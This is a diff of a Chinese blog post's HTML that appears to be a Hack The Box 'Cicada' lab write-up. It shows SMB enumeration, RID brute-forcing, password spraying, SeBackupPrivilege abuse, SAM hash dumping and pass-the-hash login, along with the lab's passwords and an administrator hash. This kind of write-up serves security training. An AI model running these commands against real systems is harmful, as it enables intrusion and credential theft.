@@ -7,12 +7,12 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="端口扫描123nmap 10.10.11.35  扫描结果  smb连接发现开放445端口有smb服务，连接试试 12345smbclient -L &#x2F;&#x2F;10.10.11.35     发现需要密码使用免密登录试试 1234567smbclient -N &#x2F;&#x2F;10.10.11.35或者enum4linux -a -u guest 10.10.11.35   把这个文件下载下来看看 123get &amp;">
+    <meta name="description" content="端口扫描 123nmap 10.10.11.35 扫描结果  smb连接 发现开放445端口有smb服务，连接试试 12345smbclient -L &#x2F;&#x2F;10.10.11.35    发现需要密码使用免密登录试试 1234567smbclient -N &#x2F;&#x2F;10.10.11.35或者enum4linux -a -u guest 10.10.11.35  把这个文件下载下来看看 123get &amp;q">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cicada">
 <meta property="og:url" content="https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Cicada/index.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="端口扫描123nmap 10.10.11.35  扫描结果  smb连接发现开放445端口有smb服务，连接试试 12345smbclient -L &#x2F;&#x2F;10.10.11.35     发现需要密码使用免密登录试试 1234567smbclient -N &#x2F;&#x2F;10.10.11.35或者enum4linux -a -u guest 10.10.11.35   把这个文件下载下来看看 123get &amp;">
+<meta property="og:description" content="端口扫描 123nmap 10.10.11.35 扫描结果  smb连接 发现开放445端口有smb服务，连接试试 12345smbclient -L &#x2F;&#x2F;10.10.11.35    发现需要密码使用免密登录试试 1234567smbclient -N &#x2F;&#x2F;10.10.11.35或者enum4linux -a -u guest 10.10.11.35  把这个文件下载下来看看 123get &amp;q">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734075856023-773cc0ea-7f5a-465d-9323-ee954d9cbbad.png">
 <meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076142025-6a80e229-a256-4390-b217-f3d769c6ddb0.png">
@@ -200,63 +200,60 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+    <h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>扫描结果</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734075856023-773cc0ea-7f5a-465d-9323-ee954d9cbbad.png"></p>
-<h2 id="smb连接"><a href="#smb连接" class="headerlink" title="smb连接"></a>smb连接</h2><p>发现开放445端口有smb服务，连接试试</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734075856023-773cc0ea-7f5a-465d-9323-ee954d9cbbad.png" alt=""></p>
+<h2 id="smb连接">smb连接</h2>
+<p>发现开放445端口有smb服务，连接试试</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -L //<span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076142025-6a80e229-a256-4390-b217-f3d769c6ddb0.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076142025-6a80e229-a256-4390-b217-f3d769c6ddb0.png" alt=""></p>
 <p>发现需要密码使用免密登录试试</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -N //<span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">enum4linux -a -u guest <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076186257-dccd6476-db0a-4137-a280-1201f41c5eed.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076186257-dccd6476-db0a-4137-a280-1201f41c5eed.png" alt=""></p>
 <p>把这个文件下载下来看看</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">get <span class="string">&quot;Notice from HR.txt&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076286015-088784ed-5382-4b79-83e5-a6be2c419433.png">获取到一个默认的密码Cicada$M6Corpb*@Lp#nZp!8</p>
-<h2 id="Rid爆破"><a href="#Rid爆破" class="headerlink" title="Rid爆破"></a>Rid爆破</h2><p>**crackmapexec **工具使用：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/14411497.html">https://www.cnblogs.com/Yang34/p/14411497.html</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076286015-088784ed-5382-4b79-83e5-a6be2c419433.png" alt="">获取到一个默认的密码Cicada$M6Corpb*@Lp#nZp!8</p>
+<h2 id="Rid爆破">Rid爆破</h2>
+<p>**crackmapexec **工具使用：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/14411497.html">https://www.cnblogs.com/Yang34/p/14411497.html</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexec smb <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -u <span class="string">&quot;guest&quot;</span> -p <span class="string">&quot;&quot;</span> --rid-brute|grep <span class="string">&quot;SidTypeUser&quot;</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">nxc smb <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -u guest -p <span class="string">&#x27;&#x27;</span> --rid-brute --users</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>这是两个工具爆破得到的结果</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077772269-c870e59a-2605-48b6-b7e0-2582c75e0dc0.png"></p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077677713-b7efcf44-c928-4826-9fc6-397e002cf836.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077772269-c870e59a-2605-48b6-b7e0-2582c75e0dc0.png" alt=""></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077677713-b7efcf44-c928-4826-9fc6-397e002cf836.png" alt=""></p>
 <p>其实都是差不多的可以得到用户名列表</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john.smouldersarah.danteliamichael.wrightsondavid.oreliousemily.oscars</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>遍历用户名密码看哪个正确</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexec ldap cicada.htb -u usernames.txt -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>发现对michael.wrightson用户可用</p>
-<h2 id="enum4linux-ng扫描"><a href="#enum4linux-ng扫描" class="headerlink" title="enum4linux-ng扫描"></a>enum4linux-ng扫描</h2><p>使用enum4linux-ng搜集所有与smb服务有关的信息</p>
+<h2 id="enum4linux-ng扫描">enum4linux-ng扫描</h2>
+<p>使用enum4linux-ng搜集所有与smb服务有关的信息</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enum4linux-ng -A -u michael.wrightson -p <span class="string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span> <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -t <span class="number">10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078232468-3c2b9270-d766-4adf-9815-5c85a0c884cb.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078232468-3c2b9270-d766-4adf-9815-5c85a0c884cb.png" alt=""></p>
 <p>发现了david的密码：aRt$Lp#7t*VQ!3</p>
 <p>使用该用户进行smb连接</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078508381-40c8f96e-3aad-4256-a202-d4876029d838.png"></p>
-<p>可以看到有一个文件下载下来使用get “文件名”命令</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078538443-737b9c71-a199-461f-939a-89ae3df6d3f0.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078508381-40c8f96e-3aad-4256-a202-d4876029d838.png" alt=""></p>
+<p>可以看到有一个文件下载下来使用get &quot;文件名&quot;命令</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078538443-737b9c71-a199-461f-939a-89ae3df6d3f0.png" alt=""></p>
 <p>发现了用户名和密码</p>
-<h2 id="winrm登录"><a href="#winrm登录" class="headerlink" title="winrm登录"></a>winrm登录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">evil-winrm -u emily.oscars -p <span class="string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span> -i <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<h2 id="winrm登录">winrm登录</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">evil-winrm -u emily.oscars -p <span class="string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span> -i <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>使用evil-winrm 登录得到用户的flag</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078796810-70cd9ccc-215c-4b7c-a636-ed009f72e2eb.png"></p>
-<h2 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a>SeBackupPrivilege</h2><p>查看当前用户的权限</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078879904-a89ebe2c-0fa1-45a3-9c32-b0ab95939a97.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078796810-70cd9ccc-215c-4b7c-a636-ed009f72e2eb.png" alt=""></p>
+<h2 id="SeBackupPrivilege">SeBackupPrivilege</h2>
+<p>查看当前用户的权限</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078879904-a89ebe2c-0fa1-45a3-9c32-b0ab95939a97.png" alt=""></p>
 <p>关于这个 SeBackupPrivilege：<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">Windows Privilege Escalation: SeBackupPrivilege – Hacking Articles</a></p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079438801-1265f913-898c-484c-a2ee-ab0700e16fe1.png"></p>
-<h2 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h2><p>使用 pypykatz 得到 admin 的 hash 值</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079937735-5303e9c5-9088-4b6e-9990-4a120fac1703.png"></p>
-<h2 id="impacket-secretsdump"><a href="#impacket-secretsdump" class="headerlink" title="impacket-secretsdump"></a>impacket-secretsdump</h2><p>或者使用impacket-secretsdump工具</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079438801-1265f913-898c-484c-a2ee-ab0700e16fe1.png" alt=""></p>
+<h2 id="pypykatz">pypykatz</h2>
+<p>使用 pypykatz 得到 admin 的 hash 值</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079937735-5303e9c5-9088-4b6e-9990-4a120fac1703.png" alt=""></p>
+<h2 id="impacket-secretsdump">impacket-secretsdump</h2>
+<p>或者使用impacket-secretsdump工具</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">impacket-secretsdump -sam sam -system system LOCAL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080255327-5e871ced-8af9-41b9-a194-93de6a543292.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080255327-5e871ced-8af9-41b9-a194-93de6a543292.png" alt=""></p>
 <p>最后使用 <code>evil-winrm</code> 的 hash 登录到 admin，得到 root.txt</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080047085-eb9bd664-2394-4281-9f8f-df0d0893ceec.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080047085-eb9bd664-2394-4281-9f8f-df0d0893ceec.png" alt=""></p>
 
   </div>
 </article>
